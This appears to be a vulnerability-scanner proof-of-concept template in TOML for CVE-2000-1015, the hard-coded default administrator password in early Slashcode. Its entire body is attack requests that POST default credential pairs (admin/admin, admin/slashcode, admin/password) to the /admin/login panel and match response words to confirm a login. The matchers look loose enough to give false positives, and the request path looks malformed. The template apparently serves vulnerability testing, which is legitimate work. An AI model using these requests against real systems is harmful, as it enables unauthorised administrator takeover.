[info]
author = "AVE"
description = "Slashcode 2.0 Alpha 之前版本存在硬编码默认管理员密码漏洞。远程攻击者可通过使用默认凭据登录 /admin 管理后台，获取管理员权限。此 PoC 通过尝试默认密码登录验证漏洞是否存在。"
id = "POC-AVE-2000-1050"
name = "Slashcode 默认管理密码漏洞 PoC"
severity = "high"
tags = [
    "cve-2000-1015",
    "default-password",
    "slashcode",
]
vuln_id = [
    "CVE-2000-1015",
    "AVE-2000-1050",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/admin/login"
protocol = "http"

[poc.requests.body]
content = "user=admin&password=admin"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "admin",
    "Administration",
    "Slashcode",
]

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/admin/login"
protocol = "http"

[poc.requests.body]
content = "user=admin&password=slashcode"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "admin",
    "Administration",
    "Slashcode",
]

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/admin/login"
protocol = "http"

[poc.requests.body]
content = "user=admin&password=password"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "admin",
    "Administration",
    "Slashcode",
]
